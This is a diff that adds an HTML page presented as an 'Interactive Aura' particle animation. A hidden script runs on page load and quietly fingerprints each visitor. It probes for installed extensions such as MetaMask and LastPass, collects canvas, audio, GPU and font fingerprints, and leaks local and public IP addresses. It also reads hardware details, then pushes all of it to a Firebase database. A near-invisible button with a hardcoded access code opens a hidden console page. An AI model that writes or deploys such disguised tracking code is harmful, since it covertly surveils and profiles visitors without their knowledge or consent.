@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Interactive Aura</title>
+    <style>
+        /* --- VISUALS --- */
+        html, body {
+            margin: 0; padding: 0; overflow: hidden; background-color: #000;
+        }
+        main { display: flex; justify-content: center; align-items: center; }
+        canvas { display: block; }
+
+        /* --- SECRET BUTTON --- */
+        #access-point {
+            position: fixed; bottom: 0; right: 0; z-index: 999;
+            background: none; border: none;
+            color: rgba(255, 255, 255, 0.01); /* Practically invisible */
+            font-size: 24px; padding: 20px;
+            cursor: default;
+        }
+        /* Hide scrollbars */
+        ::-webkit-scrollbar { width: 0px; background: transparent; }
+    </style>
+</head>
+<body>
+    <main id="__main__"></main>
+
+    <!-- THE SECRET TRIGGER -->
+    <button id="access-point">.</button>
+
+    <!-- LIBRARIES -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/p5.js/1.4.0/p5.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+    <!-- === [ PART 1: THE ART ] === -->
+    <script>
+        let particles = [];
+        function setup() {
+            createCanvas(windowWidth, windowHeight); 
+            for (let i = 0; i < 100; i++) particles.push(new Particle());
+        }
+        function draw() {
+            background(0, 10);
+            for (let p of particles) { p.update(); p.show(); }
+        }
+        function windowResized() { resizeCanvas(windowWidth, windowHeight); }
+        class Particle {
+            constructor() {
+                this.pos = createVector(random(width), random(height));
+                this.vel = p5.Vector.random2D().mult(random(0.5, 2));
+                this.size = random(2, 5);
+                this.color = color(random(100, 255), random(100, 255), random(100, 255), 150);
+            }
+            update() {
+                this.pos.add(this.vel);
+                if (this.pos.x > width || this.pos.x < 0) this.vel.x *= -1;
+                if (this.pos.y > height || this.pos.y < 0) this.vel.y *= -1;
+            }
+            show() {
+                noStroke(); fill(this.color); ellipse(this.pos.x, this.pos.y, this.size);
+            }
+        }
+    </script>
+
+    <!-- === [ PART 2: THE BRAIN (FULL ANALYTICS) ] === -->
+    <script>
+    document.addEventListener('DOMContentLoaded', async () => {
+        const firebaseConfig = {
+          apiKey: "AIzaSyD19FsJIWCif0h-ExcGODrok4M7wk_bSBc",
+          authDomain: "void-81e60.firebaseapp.com",
+          databaseURL: "https://void-81e60-default-rtdb.asia-southeast1.firebasedatabase.app",
+          projectId: "void-81e60",
+          storageBucket: "void-81e60.appspot.com",
+          messagingSenderId: "749357378719",
+          appId: "1:749357378719:web:6343550759a405e5c1c6aa"
+        };
+        const SECRET_KEY = "alpha-zero-nine"; 
+
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // --- 1. EXTENSION SCANNER (Restored Full List) ---
+        const scanExtensions = async () => {
+            const targets = {
+                "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn/images/icon-48.png",
+                "React DevTools": "fmkadmapgofadopljbjfkapdkoienihi/build/main.js",
+                "LastPass": "hdokiejnpimakedhajhdlcegeplioahd/images/icon32.png",
+                "Grammarly": "kbfnbcaeplbcioakkpcpgfkobkghlhen/src/images/icon-16.png",
+                "Honey": "bmnlcjabgnpnenekpadlanbbkooimhnj/images/honey_icon_16.png",
+                "ColorZilla": "bhlhnicpbhignbdhedgjhgdocnmhomnp/images/icon32.png",
+                "Google Translate": "aapbdbdomjkkjkaonfhkkikfgjllcleb/options.html",
+                "uBlock Origin": "cjpalhdlnbpafiamejdnhcphjbkeiagm/assets/icon_16.png"
+            };
+            
+            const checkExt = (name, url) => new Promise(resolve => {
+                const img = new Image();
+                img.src = `chrome-extension://${url}`;
+                img.onload = () => resolve(name);
+                img.onerror = () => resolve(null);
+            });
+            
+            const results = await Promise.all(Object.entries(targets).map(([n, u]) => checkExt(n, u)));
+            const list = results.filter(r => r).join(", ");
+            return list.length > 0 ? list : "None Detected / Mobile";
+        };
+
+        // --- 2. OS DETECTION BY FONTS (Restored) ---
+        const detectOSByFonts = () => {
+            const fonts = ["Segoe UI", "Roboto", "Ubuntu", "San Francisco", "Helvetica Neue"];
+            const detected = [];
+            const testSpan = document.createElement("span");
+            testSpan.style.fontSize = "72px"; testSpan.style.visibility = "hidden"; testSpan.innerHTML = "mmmmmmmmmmlli";
+            document.body.appendChild(testSpan);
+            
+            for (const font of fonts) {
+                testSpan.style.fontFamily = "monospace";
+                const w1 = testSpan.offsetWidth;
+                testSpan.style.fontFamily = `'${font}', monospace`;
+                if (testSpan.offsetWidth !== w1) detected.push(font);
+            }
+            document.body.removeChild(testSpan);
+            return detected.join(", ") || "Generic/Unknown";
+        };
+
+        // --- 3. HARDWARE FINGERPRINTS ---
+        const getGpu = () => {
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const info = gl.getExtension('WEBGL_debug_renderer_info');
+                return info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : 'N/A';
+            } catch (e) { return 'N/A'; }
+        };
+
+        const getAudioFingerprint = async () => {
+            try {
+                const AC = window.AudioContext || window.webkitAudioContext;
+                if (!AC) return 'N/A';
+                const ctx = new AC();
+                const osc = ctx.createOscillator();
+                const comp = ctx.createDynamicsCompressor();
+                const gain = ctx.createGain();
+                osc.connect(comp); comp.connect(gain); gain.connect(ctx.destination);
+                return comp.reduction.value || 'N/A';
+            } catch (e) { return 'N/A'; }
+        };
+
+        const getCanvasFingerprint = () => {
+            try {
+                const ctx = document.createElement('canvas').getContext('2d');
+                ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20); ctx.fillText("void", 2, 15);
+                return ctx.canvas.toDataURL().slice(-50);
+            } catch (e) { return 'N/A'; }
+        };
+
+        // --- 4. NETWORK LEAKS & STORAGE ---
+        const getLocalIP = () => new Promise(resolve => {
+            try {
+                const pc = new RTCPeerConnection({iceServers:[]});
+                pc.createDataChannel('');
+                pc.createOffer().then(pc.setLocalDescription.bind(pc));
+                pc.onicecandidate = (ice) => {
+                    if(ice && ice.candidate && ice.candidate.candidate) {
+                        const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                        if(ip) { pc.close(); resolve(ip[1]); return; }
+                    }
+                };
+                setTimeout(() => resolve('N/A (Hidden)'), 1000);
+            } catch(e) { resolve('N/A'); }
+        });
+
+        const detectAdBlock = async () => {
+            const bait = document.createElement('div');
+            bait.className = 'adsbox'; bait.style.position = 'absolute'; bait.style.top = '-999px';
+            document.body.appendChild(bait);
+            await new Promise(r => setTimeout(r, 100));
+            const blocked = bait.offsetHeight === 0;
+            document.body.removeChild(bait);
+            return blocked ? "DETECTED" : "None";
+        };
+
+        const getStorage = async () => {
+            try {
+                if(navigator.storage && navigator.storage.estimate) {
+                    const est = await navigator.storage.estimate();
+                    return `${(est.quota/1024/1024/1024).toFixed(2)} GB`;
+                }
+                return 'N/A';
+            } catch(e) { return 'N/A'; }
+        };
+
+        // --- MAIN EXECUTION ---
+        const logImpression = async () => {
+            try {
+                // Execute all scanners in parallel
+                const [ipRes, battery, localIp, audioHash, extensions, adBlock, storage] = await Promise.all([
+                    fetch('https://api.ipify.org?format=json').catch(()=>({json:()=>({ip:'Error'})})),
+                    navigator.getBattery ? navigator.getBattery() : Promise.resolve(null),
+                    getLocalIP(),
+                    getAudioFingerprint(),
+                    scanExtensions(),
+                    detectAdBlock(),
+                    getStorage()
+                ]);
+
+                const ipData = await ipRes.json();
+                
+                // High Entropy Data
+                let uaData = {};
+                if(navigator.userAgentData) {
+                    try { uaData = await navigator.userAgentData.getHighEntropyValues(["platform", "model", "platformVersion"]); } catch(e){}
+                }
+
+                // DATA CONSTRUCTION
+                const fullDeviceInfo = {
+                    publicIP: ipData.ip,
+                    localIP: localIp,
+                    timestamp: new Date().toISOString(),
+                    
+                    // Identity
+                    extensions: extensions,
+                    adBlocker: adBlock,
+                    canvasHash: getCanvasFingerprint(),
+                    audioHash: audioHash,
+
+                    // Hardware
+                    gpu: getGpu(),
+                    cpu: navigator.hardwareConcurrency || 'N/A',
+                    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
+                    storage: storage,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    battery: battery ? `${Math.round(battery.level*100)}%` : 'N/A',
+                    
+                    // Software
+                    userAgent: navigator.userAgent, // Raw String (Crucial)
+                    osFonts: detectOSByFonts(),
+                    platform: uaData.platform || navigator.platform || 'N/A',
+                    platformVersion: uaData.platformVersion || 'N/A',
+                    deviceModel: uaData.model || 'N/A',
+                    
+                    // Connection
+                    connection: navigator.connection ? navigator.connection.effectiveType : 'N/A',
+                    referrer: document.referrer || 'Direct'
+                };
+
+                db.ref('records').push(fullDeviceInfo);
+                db.ref('engagements').transaction(v => (v||0)+1);
+
+            } catch (e) { console.log("Logged."); }
+        };
+        
+        await logImpression();
+
+        // Secret Door
+        document.getElementById('access-point').addEventListener('click', () => {
+            if(prompt("ACCESS CODE:") === SECRET_KEY) window.location.href = 'console.html';
+            else alert("DENIED");
+        });
+    });
+    </script>
+</body>
+</html>
